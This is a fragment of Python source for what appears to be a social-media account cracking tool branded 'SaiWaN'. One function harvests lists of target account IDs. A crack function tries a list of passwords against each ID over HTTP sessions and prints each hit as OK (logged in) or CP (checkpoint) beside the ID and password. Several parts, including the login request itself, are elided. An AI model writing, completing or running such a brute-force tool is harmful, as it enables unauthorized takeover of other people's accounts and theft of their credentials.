...
def dump_massal():
	...
	try:
		print('')
		print(f' hamu id yakan {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('╰─ unstable signal ')
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'\r[deep_white] SaiWaN  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'SaiWaN-CP {kk}{idf}{P} │ {kk}{pw}{P}\n ')
				...
				print(f'SaiWaN-OK {hh}{idf}{P} │  {hh}{pw}{P}\n ')
